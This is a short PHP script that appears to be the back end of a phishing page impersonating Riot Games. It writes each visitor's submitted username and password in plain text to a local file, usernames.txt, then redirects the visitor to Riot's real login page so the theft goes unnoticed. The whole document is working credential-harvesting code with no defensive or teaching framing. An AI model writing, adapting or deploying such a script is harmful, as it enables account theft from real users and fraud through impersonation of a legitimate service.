<?php

file_put_contents("usernames.txt", "Riot Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://authenticate.riotgames.com/');
exit();
?>
